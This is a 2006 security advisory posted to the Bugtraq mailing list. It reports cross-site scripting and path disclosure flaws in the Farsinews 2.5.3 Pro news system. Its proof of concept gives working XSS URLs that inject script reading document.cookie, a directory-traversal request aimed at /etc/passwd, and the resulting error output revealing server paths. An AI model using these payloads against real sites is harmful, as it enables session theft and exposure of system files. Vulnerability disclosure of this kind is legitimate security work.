
Date: 14 Apr 2006 11:54:07 -0000
From: aminrayden@...oo.com
To: bugtraq@...urityfocus.com
Subject: Farsinews  Cross-Site Scripting & Path disclosure  vulnerability


Farsinews  Cross-Site Scripting & Path disclosure  vulnerability

#'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
#Aria-Security.net Advisory
#Discovered  by:R@...N (amin emami)
#<AminRayden@...oo.com>
#Gr33t to:A.u.r.a  & O.u.t.l.a.w & Smok3r & behzad & majid and all Persian Security team
#'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
� Software: Farsinews 2.5.3 Pro and below
� download Link:http://dl.farsinewsteam.com/?file=FarsiNews2.5.3Pro.zip
� Support Website:http://www.farsinewsteam.com/
� advisory:http://www.aria-security.net/advisory/farsinews/farsinews042006.txt

� Summary:
Farsinews is Powerful Persian news publishing system



� Proof of Concept:
XSS attack:
http://[target]/[farsinews_path]/search.php?selected_search_arch=><script>alert(document.cookie)</script><!--
http://[target]/[farsinews_path]/search.php?selected_search_arch=%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C%21--

Path disclosure:
A remote user can supply a specially crafted URL to
cause the system to display an error message that
discloses the installation path and other data.
Bug exists in "index.php"

example:
http://[target]/[farsinews_path]/index.php?subaction=showfull
&id=30000000000&archive=../../../../../../etc/passwd%00&start_from=&ucat=
1&

Error:
Warning:
file(/home/cannonc/public_html/smf/test/data/archives/../../../../../../.
./../../etc/passwd\0.news.arch):
failed to open stream: No such file or directory in
 /home/cannonc/public_html/smf/test/inc/shows.inc.php on line 62

Warning: Invalid argument supplied for foreach() in
 /home/cannonc/public_html/smf/test/inc/shows.inc.php on line 270
Can not find an article with id:30000000000


Solution:
contact advisory@...a-security.net










